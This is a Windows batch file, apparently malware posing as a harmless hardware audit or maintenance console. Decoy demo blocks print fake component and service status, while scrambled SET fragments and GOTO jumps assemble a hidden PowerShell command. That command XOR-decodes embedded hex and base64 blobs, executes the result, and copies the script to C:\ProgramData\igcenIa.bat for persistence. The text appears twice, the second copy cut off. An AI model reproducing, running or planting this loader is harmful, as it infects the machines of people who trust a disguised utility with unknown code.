@echo off




setlocal EnableDelayedExpansion

echo.

goto :skipNetwork

:: ======================================
:: Hardware Audit - DEMO ONLY
:: ======================================

:NetworkRoutine
title Hardware Audit
color DF

echo Starting Hardware Audit session...
timeout /t 1 >nul

echo Verifying system components...
timeout /t 1 >nul

for /L %%i in (1,1,6) do (
    set /a percent=!random! %% 100
    echo Component %%i ........ !percent!%%
    timeout /t 1 >nul
)

timeout /t 2 >nul

for %%A in (
    NVMe
    Cooling
    Storage
    Network
) do (
    set /a score=!random! %% 100
    echo %%A Status: !score!%%
)

timeout /t 1 >nul

for %%S in (
    FTP
    HTTP
    POP3
    RDP
) do (
    set /a state=!random! %% 2
    if !state! EQU 0 (
        echo %%S ........ ONLINE
    ) else (
        echo %%S ........ STANDBY
    )
)

echo Preview complete.
pause
goto :eof

:skipNetwork
:: ======================================
:: END OF HARDWARE AUDIT BLOCK
:: ======================================

goto :skipDemo

:: ======================================
:: Maintenance Console - DEMO ONLY
:: ======================================

:DemoRoutine
title Maintenance Console
color 8B

echo Launching Maintenance Console...
timeout /t 1 >nul

echo Verifying system components...
timeout /t 1 >nul

for /L %%i in (1,1,5) do (
    set /a percent=!random! %% 100
    echo Component %%i ........ !percent!%%
    timeout /t 1 >nul
)

echo.
echo Collecting statistics...
timeout /t 2 >nul

for %%A in (
    Power
    Cooling
    Memory
    CPU
    Network
) do (
    set /a score=!random! %% 100
    echo %%A Status: !score!%%
)

echo.
echo Checking active services...
timeout /t 1 >nul

for %%S in (
    SSH
    DHCP
    SMTP
    RDP
) do (
    set /a state=!random! %% 2
    if !state! EQU 0 (
        echo %%S ........ ONLINE
    ) else (
        echo %%S ........ STANDBY
    )
)

echo Preview complete.
pause
goto :eof

:skipDemo
:: ======================================
:: END OF MAINTENANCE CONSOLE BLOCK
:: ======================================
GOTO NINIIINSDG
:FJJIGGGJOF
SET GIINFFOOIG=489aee7bbade3f0d0f2f4eac3a9eaa2b3b490b4b3c7ade7bbade3f1d0a0f986fafd
GOTO FGDDSFNFKG
:IDIDDDJDFI
SET JNGDJGGGSO=e7fda28bb586a7bbf0a197a18dbe80ddf383f0adb4818aa8b88aaba3e6e4f4a1c
GOTO JDOIHFFDOD0
:ISNGNSKIFD
SET GGNFDDDIIK=$nU0qrJ4c;$nU0qrJ4c=@();foreach($c in [char[]]$bWQiM6){$nU0qrJ4
GOTO NGNNIJIGIO3
:GGIINOIDNJ
SET SDNODSKFID=84a6d0edafbaf1afa4a996b5fd8ee1ebfefffce498eff1c3a8fab3e8b1f6c49bf5cee0b4bbad
GOTO IDIDDDJDFI
:NGNNIJIGIO
SET IOIDJIHNKH=8dfac38e89a1f1e1d8a9a4938da9b489aee7c4aea9b49c8080bae194ccb5a3b49cb6f
GOTO JDSNJDOFIN
:IOIFGDFUFF
SET HSDGNGDGDK=39fd298e0b7ada3e9de858df8a59b949e8e90b48080d08ebc8ab79984be859bde8698b992ef
GOTO HHIOFOIODS7
:SDNIIDNJUO
SET OJHNDOGIIN=sNRxoDHy57RDgReyILS3BxT3o/HxxAG3BZJgNxfwsNRxoPEyYMfX4WFyFYV3AhDQsVPBB
GOTO IDINFJSIFG
:FJJJNOINDN
SET SFOIUIJFGG=1b4b889a999989f999df4879e9595978c90f4f2b8e5ddcab8bfb9ca9db6efa9f0ed
GOTO FODGDSGGOG
:NGNNIJIGIO5
SET KDNIJJJDFI=Convert]::ToInt32($ooomD83ul.Substring($j,2),16))-bxor$x27vZ
GOTO NGNNIJIGIO6
:DNDKOODJOD
SET KSGNNDOJJF=99a99e8c95d7a2fbccb59d98b8bcb28d88b5f88d98aac9e38e8fbabbd1b4e0b2b0b18
GOTO HHIOFOIODS5
:JJSGDDGNNO
SET IFIDIFHJSG=Wz4lG2QQHzBpVkAUaUhLb2FaY1QjcVxnUGBrThEZQBgPF1lCAj9wSFhVbG47GQUxDT1qEw8
GOTO JJHNSDIFOO6
:FDNOOGDFGN
SET GINNHIGSOD=aVcQa11BXwN0WFhgYkVWY3cyZndpVE9rXmdANmcebldnSigLF0kaBjIMTUQwHhQCARJbJgBA
GOTO JUUFJDSJNN
:IFSNKDKSGI
SET NDONFGKFUN=cf9e8991b4a1edd78a9cd2a59e81b8a18da3ae99d6b5e190aab3b5ae9ab5d6a6
GOTO DNDKOODJOD
:GGFJDDNOII
SET JIOSUGGGHG=189ed9d85a4ec9c98a9c9989eb38ca6dba79dbab4b19cb081a5d6bf91b89e8f92a3ae95d2
GOTO FUDDGDNJJD
:FUDDGDNJJD
SET JSHGDJODIJ=a6b7efbe9eb5ab8ca7ecb884a7c1a98eb4be8bd89eb3b3bda3e9c8828ee8959c948e909aa5879fd
GOTO FJJJNOINDN
:FFGDIISFOG
SET DFKGDGNOGF=baefacc1da9bb7bea9c99aaaedbab9a39c8bb28ea7bbd2adbea19ebeafbaf3f5cca9b3b58bb2a
GOTO FGDDDGGDGI
:JUUFJDSJNN
SET DDGIFFNODN=KR8dAV1LFyJFFiVtZAVLWxFDSkF3UlkOVHIFPHF2Xg4eJ1ZbbHJWS3ZRGERRHRYvCU95QlMIG3
GOTO GGGDIUNDJD
:GJFDJGDOND
SET DISGDFGGDG=Bl59.Length])};$sgy5LMN=$nU0qrJ4coldR;$ljjdkL=$sb2mnWaH9+$sgy5LMN;
GOTO OFFFIGDFGD
:FIOGFDDIJD
SET IIFOSKGDOI=IBnkAGR0+JTIMAEApC3BIGwdgYAQFXVEELxQGHy0ECkdQEEdwRH1QcnAgfXMyfnp3QHV4Xm
GOTO JDOIHFFDOD6
:OSGISDGOFF
SET DIHDJOODFN=97a58d88a995a0a1f8e48b8396b5ab82bbbbc2f6ea868bb4b0a5a8bcfafae4938da9b
GOTO FJJIGGGJOF
:NGNNIJIGIO7
SET NGGNOGFSSJ=oldB=[Convert]::FromBase64String([regex]::Replace($uU5okOP, ''$n
GOTO NGNNIJIGIO8
:JDOIHFFDOD
SET JFSGNHGSIG=nd \"$j=81-28;$bWQiM6=''wMce5fzjSq'';$ooomD83ul=''bb92a7aceba5bfa
GOTO JJHNSDIFOO
:DJIOIDNDDU
SET NNOFDNDIOF=1e7b3a5bcaefeddcaddbaeed7f4e7c0aaf0e7b1b294d78aa7f8949792c9ad
GOTO HHIOFOIODS1
:DGGDSIGGNJ
SET NSDGGDDFGD=b7abf596a7c1bc8e8dbe8ed899b7b3bdb290bf88a4a7b49f92bf95909df998d9b695f9b
GOTO GGFJDDNOII
:FODGDSGGOG
SET OFODFFGGIF=ada2ad828daaf9a5bea98db2b289e9e7c498b5b88df59889aaa0fba5bea7a4e1e7b29d89a7e2
GOTO OSGISDGOFF
:FGDDSFNFKG
SET NNKDDGOGSS=a282b5b7d494bf8dacacebec9ea58df58a82ab8cf3a5b5ae8de0f5a0acbbb29eb1ae9db4b0
GOTO DFNIUGFIGD
:JDOIHFFDOD3
SET DOFNOONDDF=ccENcTk97SDF5a1d1cWVKDg1HGgYWPQBAKAtZBhsOG2cdDFFFYxRSW1ZlDVlDd1
GOTO JDOIHFFDOD4
:FNODFSKKKN
SET JJGOGOGJFG=GYyUHl4UHV7XE55L3ZXDlByd1l8eDFYTHpUFEFdXkcqe25UYwMLOA0QRFEcHzsEBnoFHjNGTU
GOTO GSDIJISOFD
:IDINFJSIFG
SET KSGGODUING=AEw94Y1APSERfA1ZcTHpXTWpCECNjeh8rQEdrVUwTVkNaZVACNVBZEkBbHzNYRGwWf
GOTO NGNNIJIGIO0
:KDDFHDNDOD
SET DIDFFOGIID=b280859af09c9cb89aa89b9faef6d38e91a5a98984aa8e8dde86989292a291a58496
GOTO IFSNKDKSGI
:JDOIHFFDOD7
SET OOJNGHOFFI=ZnROY1grZ3ltSnVJaGNkUHl6bDZIb05jCTV2blBiAwsxGhhIbEkfIWFFLHlzC3F5
GOTO FDNOOGDFGN
:OFFFIGDFGD
SET IDDGIDOOFG=.($env:ComSpec[4,26,25]-join'''') $ljjdkL\"'" ; Copy-Item -P
GOTO JDSNJDOFIN2
:GNGGKDOIDH
SET GJOJGGJIJG=xhWT3BdERlJSCI1JgQGegUQXRMHYGAEBVxReS9lbWpTYVprU3UYR3l5RGlAXgdlK
GOTO FGIDOFIDFS
:NGNNIJIGIO6
SET ODOINJIGFG=5ia[$i++%%$x27vZ5ia.Length])};$sb2mnWaH9=$nU0qrJ4coldR;$nU0qrJ4c
GOTO NGNNIJIGIO7
:NGNNIJIGIO4
SET IFGODSODUD=or($j=0;$j-lt$ooomD83ul.Length;$j+=2){$nU0qrJ4coldR+=[char](([
GOTO NGNNIJIGIO5
:GSDIJISOFD
SET JFFDDIHHIN=xyVkt2URhQHw8bZBcMVFNeB0dHHysEEyofPWoXTgw3BB84Hm8GEwhscRkfPx8Q
GOTO JJSGDDGNNO
:JDSNJDOFIN
SET NGOGGGSFGI=3a4a6a1e9a9a2b4a4e1e7a1bba0f28eb1b39cede9b4bdbdf6a2b7e8ddb9b0b4e0b3bab7f
GOTO FDDGGSONUS
:FGIDOFIDFS
SET FOGIOIFNGU=ntHTGBhTk18eCILZmlXFEBbcGUydXlqYmJzf31mUENgeX4ce15OCDl0V2ZQZ2BNb
GOTO FNODFSKKKN
:JDSNJDOFIN2
SET IJOGGGNJKG=ath '%~f0' -Destination 'C:\ProgramData\igcenIa.bat' -Force -ErrorActi
GOTO JDSNJDOFIN3
:GGGDIUNDJD
SET JDFSFFGNIJ=BZJgNwc29ALFlcAiENAjMWGD9VDxhNZxddZHYqZnp6UHBwc28fLnISAiENAjMWGD9VD
GOTO GNGGKDOIDH
:NGNNIJIGIO1
SET GFSIGSNGNF=reach($c in [char[]]$bWQiM6){$nU0qrJ4c+=[byte]($c-bxor0xAA)};$x27vZ5ia=
GOTO ISNGNSKIFD
:FDDGGSONUS
SET OGNJIJDNNH=49fd4b9a588bbebf4b1f9e984d6d7eac39cebada2b4d488b182acbfbfe183a59ab4b383
GOTO FFGDIISFOG
:FGDDDGGDGI
SET FOKGFJGUGF=99e99bdf0b8bfa396b7fddae994d1a9a4eeaabebe92bba6ebb580b296afb284a6a3cbb5a0a5a4e
GOTO DJIOIDNDDU
:JDOIHFFDOD6
SET SOSGJJJDFO=RUNnJXal5ycGt9cwxmdXd+dW1eZ1w2Zx5uV2dKKAsXSRoDFy57RDgRdQcHYHxt
GOTO JDOIHFFDOD7
:JDOIHFFDOD2
SET NKIOUNJFJU=VgxWTEtvS0w2dFkOV0ZRYWJOeVFDPRtwWSYDaX8OaSZbYmVQTnNOcHMPY2h9X3BlTm9AJFt
GOTO JDOIHFFDOD3
:HHIOFOIODS
SET ONNIOGFSGI=-Command "Start-Process $env:SystemRoot\System32\WindowsPowerShell\
GOTO NSINKUJFNS
:NGNNIJIGIO9
SET GFNDDHSDHF=++){$nU0qrJ4coldR+=[char]($nU0qrJ4coldB[$j]-bxor$l5PQbBl59[$i++%%$l5PQb
GOTO GJFDJGDOND
:HHIOFOIODS7
SET SGDFGDIDGU=9bb4a6b9cf8d919aaa98aaa880b7fc8f84baa089958f90aacfb5a88fb098edd79a
GOTO DGGDSIGGNJ
:NINIIINSDG
SET HNDFOIGNKI=%SYSTEMROOT%\System32\WindowsPowerShell\v1.0\powershell.exe 
GOTO HHIOFOIODS
:JDSNJDOFIN3
SET OSIISDONIO=on SilentlyContinue
GOTO JDSNJDOFIN4
:HHIOFOIODS1
SET IGFDODGDFJ=8eb5908ed7a6e0b3bdb188a3868aec968382a08b94a684fbd3a4e8a9b79e
GOTO KDDFHDNDOD
:JJHNSDIFOO
SET GSFFDOSOGO=ed984bbcfedadf29ff9bbddb0e0d6fbfda49783b98aafb88ae79bfab4a4eebcb5be88ada6f1ab
GOTO NGNNIJIGIO
:JDSNJDOFIN4
%HNDFOIGNKI%%ONNIOGFSGI%%UOSDIIDIDF%%JFSGNHGSIG%%GSFFDOSOGO%%IOIDJIHNKH%%NGOGGGSFGI%%OGNJIJDNNH%%DFKGDGNOGF%%FOKGFJGUGF%%NNOFDNDIOF%%IGFDODGDFJ%%DIDFFOGIID%%NDONFGKFUN%%KSGNNDOJJF%%OJFONFGODI%%HSDGNGDGDK%%SGDFGDIDGU%%NSDGGDDFGD%%JIOSUGGGHG%%JSHGDJODIJ%%SFOIUIJFGG%%OFODFFGGIF%%DIHDJOODFN%%GIINFFOOIG%%NNKDDGOGSS%%OJJDNGNIJN%%FONFNHOGIS%%SDNODSKFID%%JNGDJGGGSO%%DOSFNGJIDH%%NFGDJDNUGU%%NKIOUNJFJU%%DOFNOONDDF%%NJDIFJSJJF%%IIFOSKGDOI%%SOSGJJJDFO%%OOJNGHOFFI%%GINNHIGSOD%%DDGIFFNODN%%JDFSFFGNIJ%%GJOJGGJIJG%%FOGIOIFNGU%%JJGOGOGJFG%%JFFDDIHHIN%%IFIDIFHJSG%%FIKDSDGHUG%%GJDOIGKGFN%%OJHNDOGIIN%%KSGGODUING%%JOGDSOOFGO%%GFSIGSNGNF%%GGNFDDDIIK%%UIFDJDODFG%%IFGODSODUD%%KDNIJJJDFI%%ODOINJIGFG%%NGGNOGFSSJ%%GHDGJJHJDO%%GFNDDHSDHF%%DISGDFGGDG%%IDDGIDOOFG%%IJOGGGNJKG%%OSIISDONIO%
GOTO JDSNJDOFIN5
:FGGNGOJGSH
SET FONFNHOGIS=ebb9a2aed9ffbcd4fbe1dba3a7ae95b4bc838daeebadf8e4a6f2a084a8bbfca4abbd
GOTO GGIINOIDNJ
:JDOIHFFDOD4
SET NJDIFJSJJF=MUWllecktQRQwKI0FKXnJBa3ZFRAFdTFouAEMgH01bF04GKG1MbllbBRsLXTY
GOTO FIOGFDDIJD
:JJHNSDIFOO6
SET FIKDSDGHUG=fJk0CMG1zD11ZWnRQfyIMdhJcQn1nV0cuAmMUQUZRYQwGVVdEA1tKTF0VfzEfEE
GOTO JJHNSDIFOO7
:NGNNIJIGIO8
SET GHDGJJHJDO=U0qrJ4c'', ''''));$nU0qrJ4coldR='''';$i=0;for($j=0;$j-lt$nU0qrJ4coldB.Length;$j
GOTO NGNNIJIGIO9
:DFNIUGFIGD
SET OJJDNGNIJN=c7edaeacfdf0edbab4a889bdefbbade3f1d798b292a7bbb6b0f5bb8da9a49cbbaa
GOTO FGGNGOJGSH
:JDOIHFFDOD0
SET DOSFNGJIDH=af2e6c3a8f7a2e8b1f7d79cb8939db6efa9a3e8d0a7e29ced90b18aa5ac9595bc8aacef
GOTO JDOIHFFDOD1
:NSINKUJFNS
SET UOSDIIDIDF=v1.0\powershell.exe -WindowStyle Hidden -ArgumentList '-Comma
GOTO JDOIHFFDOD
:NGNNIJIGIO3
SET UIFDJDODFG=c+=[byte]($c-bxor0x55)};$l5PQbBl59=$nU0qrJ4c;$nU0qrJ4coldR='''';$i=0;f
GOTO NGNNIJIGIO4
:NGNNIJIGIO0
SET JOGDSOOFGO=gFeShNFdHc4Sz1qPiUfJgQCOBYQQBMP'';$efxuisKTE=0x4111-0x363F;$nU0qrJ4c=@();fo
GOTO NGNNIJIGIO1
:JJHNSDIFOO7
SET GJDOIGKGFN=RRGx8ue0Q4EXMhC3p8V08fPx8QIBsLXTUIAjxXA1EfDxdZQgI/c0hQaWdHV15lbw
GOTO SDNIIDNJUO
:JDOIHFFDOD1
SET NFGDJDNUGU=b2a9'';$uU5okOP=''UzgSUVROFBtnHR88VwhOdEpLS0FWcFlUSBdOCioMeUpT
GOTO JDOIHFFDOD2
:HHIOFOIODS5
SET OJFONFGODI=ca6808cae8095b89ea298b5f9bacf999d93b09fe5df888df3859c81cdb19b908
GOTO IOIFGDFUFF
:JDSNJDOFIN5@echo off




setlocal EnableDelayedExpansion

echo.

goto :skipNetwork

:: ======================================
:: Hardware Audit - DEMO ONLY
:: ======================================

:NetworkRoutine
title Hardware Audit
color DF

echo Starting Hardware Audit session...
timeout /t 1 >nul

echo Verifying system components...
timeout /t 1 >nul

for /L %%i in (1,1,6) do (
    set /a percent=!random! %% 100
    echo Component %%i ........ !percent!%%
    timeout /t 1 >nul
)

timeout /t 2 >nul

for %%A in (
    NVMe
    Cooling
    Storage
    Network
) do (
    set /a score=!random! %% 100
    echo %%A Status: !score!%%
)

timeout /t 1 >nul

for %%S in (
    FTP
    HTTP
    POP3
    RDP
) do (
    set /a state=!random! %% 2
    if !state! EQU 0 (
        echo %%S ........ ONLINE
    ) else (
        echo %%S ........ STANDBY
    )
)

echo Preview complete.
pause
goto :eof

:skipNetwork
:: ======================================
:: END OF HARDWARE AUDIT BLOCK
:: ======================================

goto :skipDemo

:: ======================================
:: Maintenance Console - DEMO ONLY
:: ======================================

:DemoRoutine
title Maintenance Console
color 8B

echo Launching Maintenance Console...
timeout /t 1 >nul

echo Verifying system components...
timeout /t 1 >nul

for /L %%i in (1,1,5) do (
    set /a percent=!random! %% 100
    echo Component %%i ........ !percent!%%
    timeout /t 1 >nul
)

echo.
echo Collecting statistics...
timeout /t 2 >nul

for %%A in (
    Power
    Cooling
    Memory
    CPU
    Network
) do (
    set /a score=!random! %% 100
    echo %%A Status: !score!%%
)

echo.
echo Checking active services...
timeout /t 1 >nul

for %%S in (
    SSH
    DHCP
    SMTP
    RDP
) do (
    set /a state=!random! %% 2
    if !state! EQU 0 (
        echo %%S ........ ONLINE
    ) else (
        echo %%S ........ STANDBY
    )
)

echo Preview complete.
pause
goto :eof

:skipDemo
:: ======================================
:: END OF MAINTENANCE CONSOLE BLOCK
:: ======================================
GOTO NINIIINSDG
:FJJIGGGJOF
SET GIINFFOOIG=489aee7bbade3f0d0f2f4eac3a9eaa2b3b490b4b3c7ade7bbade3f1d0a0f986fafd
GOTO FGDDSFNFKG
:IDIDDDJDFI
SET JNGDJGGGSO=e7fda28bb586a7bbf0a197a18dbe80ddf383f0adb4818aa8b88aaba3e6e4f4a1c
GOTO JDOIHFFDOD0
:ISNGNSKIFD
SET GGNFDDDIIK=$nU0qrJ4c;$nU0qrJ4c=@();foreach($c in [char[]]$bWQiM6){$nU0qrJ4
GOTO NGNNIJIGIO3
:GGIINOIDNJ
SET SDNODSKFID=84a6d0edafbaf1afa4a996b5fd8ee1ebfefffce498eff1c3a8fab3e8b1f6c49bf5cee0b4bbad
GOTO IDIDDDJDFI
:NGNNIJIGIO
SET IOIDJIHNKH=8dfac38e89a1f1e1d8a9a4938da9b489aee7c4aea9b49c8080bae194ccb5a3b49cb6f
GOTO JDSNJDOFIN
:IOIFGDFUFF
SET HSDGNGDGDK=39fd298e0b7ada3e9de858df8a59b949e8e90b48080d08ebc8ab79984be859bde8698b992ef
GOTO HHIOFOIODS7
:SDNIIDNJUO
SET OJHNDOGIIN=sNRxoDHy57RDgReyILS3BxT3o/HxxAG3BZJgNxfwsNRxoPEyYMfX4WFyFYV3AhDQsVPBB
GOTO IDINFJSIFG
:FJJJNOINDN
SET SFOIUIJFGG=1b4b889a999989f999df4879e9595978c90f4f2b8e5ddcab8bfb9ca9db6efa9f0ed
GOTO FODGDSGGOG
:NGNNIJIGIO5
SET KDNIJJJDFI=Convert]::ToInt32($ooomD83ul.Substring($j,2),16))-bxor$x27vZ
GOTO NGNNIJIGIO6
:DNDKOODJOD
SET KSGNNDOJJF=99a99e8c95d7a2fbccb59d98b8bcb28d88b5f88d98aac9e38e8fbabbd1b4e0b2b0b18
GOTO HHIOFOIODS5
:JJSGDDGNNO
SET IFIDIFHJSG=Wz4lG2QQHzBpVkAUaUhLb2FaY1QjcVxnUGBrThEZQBgPF1lCAj9wSFhVbG47GQUxDT1qEw8
GOTO JJHNSDIFOO6
:FDNOOGDFGN
SET GINNHIGSOD=aVcQa11BXwN0WFhgYkVWY3cyZndpVE9rXmdANmcebldnSigLF0kaBjIMTUQwHhQCARJbJgBA
GOTO JUUFJDSJNN
:IFSNKDKSGI
SET NDONFGKFUN=cf9e8991b4a1edd78a9cd2a59e81b8a18da3ae99d6b5e190aab3b5ae9ab5d6a6
GOTO DNDKOODJOD
:GGFJDDNOII
SET JIOSUGGGHG=189ed9d85a4ec9c98a9c9989eb38ca6dba79dbab4b19cb081a5d6bf91b89e8f92a3ae95d2
GOTO FUDDGDNJJD
:FUDDGDNJJD
SET JSHGDJODIJ=a6b7efbe9eb5ab8ca7ecb884a7c1a98eb4be8bd89eb3b3bda3e9c8828ee8959c948e909aa5879fd
GOTO FJJJNOINDN
:FFGDIISFOG
SET DFKGDGNOGF=baefacc1da9bb7bea9c99aaaedbab9a39c8bb28ea7bbd2adbea19ebeafbaf3f5cca9b3b58bb2a
GOTO FGDDDGGDGI
:JUUFJDSJNN
SET DDGIFFNODN=KR8dAV1LFyJFFiVtZAVLWxFDSkF3UlkOVHIFPHF2Xg4eJ1ZbbHJWS3ZRGERRHRYvCU95QlMIG3
GOTO GGGDIUNDJD
:GJFDJGDOND
SET DISGDFGGDG=Bl59.Length])};$sgy5LMN=$nU0qrJ4coldR;$ljjdkL=$sb2mnWaH9+$sgy5LMN;
GOTO OFFFIGDFGD
:FIOGFDDIJD
SET IIFOSKGDOI=IBnkAGR0+JTIMAEApC3BIGwdgYAQFXVEELxQGHy0ECkdQEEdwRH1QcnAgfXMyfnp3QHV4Xm
GOTO JDOIHFFDOD6
:OSGISDGOFF
SET DIHDJOODFN=97a58d88a995a0a1f8e48b8396b5ab82bbbbc2f6ea868bb4b0a5a8bcfafae4938da9b
GOTO FJJIGGGJOF
:NGNNIJIGIO7
SET NGGNOGFSSJ=oldB=[Convert]::FromBase64String([regex]::Replace($uU5okOP, ''$n
GOTO NGNNIJIGIO8
:JDOIHFFDOD
SET JFSGNHGSIG=nd \"$j=81-28;$bWQiM6=''wMce5fzjSq'';$ooomD83ul=''bb92a7aceba5bfa
GOTO JJHNSDIFOO
:DJIOIDNDDU
SET NNOFDNDIOF=1e7b3a5bcaefeddcaddbaeed7f4e7c0aaf0e7b1b294d78aa7f8949792c9ad
GOTO HHIOFOIODS1
:DGGDSIGGNJ
SET NSDGGDDFGD=b7abf596a7c1bc8e8dbe8ed899b7b3bdb290bf88a4a7b49f92bf95909df998d9b695f9b
GOTO GGFJDDNOII
:FODGDSGGOG
SET OFODFFGGIF=ada2ad828daaf9a5bea98db2b289e9e7c498b5b88df59889aaa0fba5bea7a4e1e7b29d89a7e2
GOTO OSGISDGOFF
:FGDDSFNFKG
SET NNKDDGOGSS=a282b5b7d494bf8dacacebec9ea58df58a82ab8cf3a5b5ae8de0f5a0acbbb29eb1ae9db4b0
GOTO DFNIUGFIGD
:JDOIHFFDOD3
SET DOFNOONDDF=ccENcTk97SDF5a1d1cWVKDg1HGgYWPQBAKAtZBhsOG2cdDFFFYxRSW1ZlDVlDd1
GOTO JDOIHFFDOD4
:FNODFSKKKN
SET JJGOGOGJFG=GYyUHl4UHV7XE55L3ZXDlByd1l8eDFYTHpUFEFdXkcqe25UYwMLOA0QRFEcHzsEBnoFHjNGTU
GOTO GSDIJISOFD
:IDINFJSIFG
SET KSGGODUING=AEw94Y1APSERfA1ZcTHpXTWpCECNjeh8rQEdrVUwTVkNaZVACNVBZEkBbHzNYRGwWf
GOTO NGNNIJIGIO0
:KDDFHDNDOD
SET DIDFFOGIID=b280859af09c9cb89aa89b9faef6d38e91a5a98984aa8e8dde86989292a291a58496
GOTO IFSNKDKSGI
:JDOIHFFDOD7
SET OOJNGHOFFI=ZnROY1grZ3ltSnVJaGNkUHl6bDZIb05jCTV2blBiAwsxGhhIbEkfIWFFLHlzC3F5
GOTO FDNOOGDFGN
:OFFFIGDFGD
SET IDDGIDOOFG=.($env:ComSpec[4,26,25]-join'''') $ljjdkL\"'" ; Copy-Item -P
GOTO JDSNJDOFIN2
:GNGGKDOIDH
SET GJOJGGJIJG=xhWT3BdERlJSCI1JgQGegUQXRMHYGAEBVxReS9lbWpTYVprU3UYR3l5RGlAXgdlK
GOTO FGIDOFIDFS
:NGNNIJIGIO6
SET ODOINJIGFG=5ia[$i++%%$x27vZ5ia.Length])};$sb2mnWaH9=$nU0qrJ4coldR;$nU0qrJ4c
GOTO NGNNIJIGIO7
:NGNNIJIGIO4
SET IFGODSODUD=or($j=0;$j-lt$ooomD83ul.Length;$j+=2){$nU0qrJ4coldR+=[char](([
GOTO NGNNIJIGIO5
:GSDIJISOFD
SET JFFDDIHHIN=xyVkt2URhQHw8bZBcMVFNeB0dHHysEEyofPWoXTgw3BB84Hm8GEwhscRkfPx8Q
GOTO JJSGDDGNNO
:JDSNJDOFIN
SET NGOGGGSFGI=3a4a6a1e9a9a2b4a4e1e7a1bba0f28eb1b39cede9b4bdbdf6a2b7e8ddb9b0b4e0b3bab7f
GOTO FDDGGSONUS
:FGIDOFIDFS
SET FOGIOIFNGU=ntHTGBhTk18eCILZmlXFEBbcGUydXlqYmJzf31mUENgeX4ce15OCDl0V2ZQZ2BNb
GOTO FNODFSKKKN
:JDSNJDOFIN2
SET IJOGGGNJKG=ath '%~f0' -Destination 'C:\ProgramData\igcenIa.bat' -Force -ErrorActi
GOTO JDSNJDOFIN3
:GGGDIUNDJD
SET JDFSFFGNIJ=BZJgNwc29ALFlcAiENAjMWGD9VDxhNZxddZHYqZnp6UHBwc28fLnISAiENAjMWGD9VD
GOTO GNGGKDOIDH
:NGNNIJIGIO1
SET GFSIGSNGNF=reach($c in [char[]]$bWQiM6){$nU0qrJ4c+=[byte]($c-bxor0xAA)};$x27vZ5ia=
GOTO ISNGNSKIFD
:FDDGGSONUS
SET OGNJIJDNNH=49fd4b9a588bbebf4b1f9e984d6d7eac39cebada2b4d488b182acbfbfe183a59ab4b383
GOTO FFGDIISFOG
:FGDDDGGDGI
SET FOKGFJGUGF=99e99bdf0b8bfa396b7fddae994d1a9a4eeaabebe92bba6ebb580b296afb284a6a3cbb5a0a5a4e
GOTO DJIOIDNDDU
:JDOIHFFDOD6
SET SOSGJJJDFO=RUNnJXal5ycGt9cwxmdXd+dW1eZ1w2Zx5uV2dKKAsXSRoDFy57RDgRdQcHYHxt
GOTO JDOIHFFDOD7
:JDOIHFFDOD2
SET NKIOUNJFJU=VgxWTEtvS0w2dFkOV0ZRYWJOeVFDPRtwWSYDaX8OaSZbYmVQTnNOcHMPY2h9X3BlTm9AJFt
GOTO JDOIHFFDOD3
:HHIOFOIODS
SET ONNIOGFSGI=-Command "Start-Process $env:SystemRoot\System32\WindowsPowerShell\
GOTO NSINKUJFNS
:NGNNIJIGIO9
SET GFNDDHSDHF=++){$nU0qrJ4coldR+=[char]($nU0qrJ4coldB[$j]-bxor$l5PQbBl59[$i++%%$l5PQb
GOTO GJFDJGDOND
:HHIOFOIODS7
SET SGDFGDIDGU=9bb4a6b9cf8d919aaa98aaa880b7fc8f84baa089958f90aacfb5a88fb098edd79a
GOTO DGGDSIGGNJ
:NINIIINSDG
SET HNDFOIGNKI=%SYSTEMROOT%\System32\WindowsPowerShell\v1.0\powershell.exe 
GOTO HHIOFOIODS
:JDSNJDOFIN3
SET OSIISDONIO=on SilentlyContinue
GOTO JDSNJDOFIN4
:HHIOFOIODS1
SET IGFDODGDFJ=8eb5908ed7a6e0b3bdb188a3868aec968382a08b94a684fbd3a4e8a9b79e
GOTO KDDFHDNDOD
:JJHNSDIFOO
SET GSFFDOSOGO=ed984bbcfedadf29ff9bbddb0e0d6fbfda49783b98aafb88ae79bfab4a4eebcb5be88ada6f1ab
GOTO NGNNIJIGIO
:JDSNJDOFIN4
%HNDFOIGNKI%%ONNIOGFSGI%%UOSDIIDIDF%%JFSGNHGSIG%%GSFFDOSOGO%%IOIDJIHNKH%%NGOGGGSFGI%%OGNJIJDNNH%%DFKGDGNOGF%%FOKGFJGUGF%%NNOFDNDIOF%%IGFDODGDFJ%%DIDFFOGIID%%NDONFGKFUN%%KSGNNDOJJF%%OJFONFGODI%%HSDGNGDGDK%%SGDFGDIDGU%%NSDGGDDFGD%%JIOSUGGGHG%%JSHGDJODIJ%%SFOIUIJFGG%%OFODFFGGIF%%DIHDJOODFN%%GIINFFOOIG%%NNKDDGOGSS%%OJJDNGNIJN%%FONFNHOGIS%%SDNODSKFID%%JNGDJGGGSO%%DOSFNGJIDH%%NFGDJDNUGU%%NKIOUNJFJU%%DOFNOONDDF%%NJDIFJSJJF%%IIFOSKGDOI%%SOSGJJJDFO%%OOJNGHOFFI%%GINNHIGSOD%%DDGIFFNODN%%JDFSFFGNIJ%%GJOJGGJIJG%%FOGIOIFNGU%%JJGOGOGJFG%%JFFDDIHHIN%%IFIDIFHJSG%%FIKDSDGHUG%%GJDOIGKGFN%%OJHNDOGIIN%%KSGGODUING%%JOGDSOOFGO%%GFSIGSNGNF%%GGNFDDDIIK%%UIFDJDODFG%%IFGODSODUD%%KDNIJJJDFI%%ODOINJIGFG%%NGGNOGFSSJ%%GHDGJJHJDO%%GFNDDHSDHF%%DISGDFGGDG%%IDDGIDOOFG%%IJOGGGNJKG%%OSIISDONIO%
GOTO JDSNJDOFIN5
:FGGNGOJGSH
SET FONFNHOGIS=ebb9a2aed9ffbcd4fbe1dba3a7ae95b4bc838daeebadf8e4a6f2a084a8bbfca4abbd
GOTO GGIINOIDNJ
:JDOIHFFDOD4
SET NJDIFJSJJF=MUWllecktQRQwKI0FKXnJBa3ZFRAFdTFouAEMgH01bF04GKG1MbllbBRsLXTY
GOTO FIOGFDDIJD
:JJHNSDIFOO6
SET FIKDSDGHUG=fJk0CMG1zD11ZWnRQfyIMdhJcQn1nV0cuAmMUQUZRYQwGVVdEA1tKTF0VfzEfEE
GOTO JJHNSDIFOO7
:NGNNIJIGIO8
SET GHDGJJHJDO=U0qrJ4c'', ''''));$nU0qrJ4coldR='''';$i=0;for($j=0;$j-lt$nU0qrJ4coldB.Length;$j
GOTO NGNNIJIGIO9
:DFNIUGFIGD
SET OJJDNGNIJN=c7edaeacfdf0edbab4a889bdefbbade3f1d798b292a7bbb6b0f5bb8da9a49cbbaa
GOTO FGGNGOJGSH
